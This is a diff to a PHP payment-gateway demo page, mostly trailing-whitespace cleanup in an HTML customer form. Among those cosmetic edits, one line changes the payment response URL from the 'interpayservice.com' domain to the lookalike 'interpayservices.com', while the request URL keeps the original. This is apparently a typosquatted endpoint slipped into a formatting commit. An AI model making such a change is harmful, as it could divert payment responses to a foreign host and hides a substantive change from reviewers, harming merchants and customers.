@@ -1,9 +1,10 @@
-<?php 
+<?php
 include_once __DIR__.'/pg_helper.php';
 
 // Define environment variable
 define('PG_REQUEST_URL', 'https://secure.interpayservice.com/pgui/jsp/paymentrequest');
-define('PG_RESPONSE_URL', 'https://secure.interpayservice.com/pgui/jsp/response.jsp');
+define('PG_RESPONSE_URL', 'https://secure.interpayservices.com/pgui/jsp/response.jsp');
+
 define('PG_RESPONSE_MODE', 'SALE');
 define('PG_SALT', '0000000000000000');
 define('PG_APP_ID', '0000000000000000');
@@ -118,14 +119,14 @@ if (isset($_REQUEST['payment_check'])) {
                         <input type="text" name="CUST_NAME" class="signuptextfield" value="DEMO" autocomplete="off"/>
                     </td>
                     <td width="7%" align="left" valign="middle">&nbsp;</td>
-                </tr>                   
+                </tr>
                 <tr>
                     <td width="28%" align="right" valign="middle" class="labelfont">CUSTOMER ADDRESS: </td>
                     <td width="65%" align="left" valign="middle">
                         <input type="text" name="CUST_STREET_ADDRESS1" class="signuptextfield" value="Gurgaon" autocomplete="off"/>
                     </td>
                     <td width="7%" align="left" valign="middle">&nbsp;</td>
-                </tr>                   
+                </tr>
                 <tr>
                     <td width="28%" align="right" valign="middle" class="labelfont">CUSTOMER ZIP: </td>
                     <td width="65%" align="left" valign="middle">
@@ -183,7 +184,7 @@ if (isset($_REQUEST['payment_check'])) {
                     <!-- <td width="50%" align="right" ></td> -->
                     <td colspan="3" align="center" valign="middle">
                         <input type="hidden" name="payment_check" value="true">
-                        <input type="submit" name="button" id="button" class="signupbutton" value="Pay Now" onclick="javascript:submitForm()"/>                     
+                        <input type="submit" name="button" id="button" class="signupbutton" value="Pay Now" onclick="javascript:submitForm()"/>
                     </td>
                 </tr>
                 <tr>
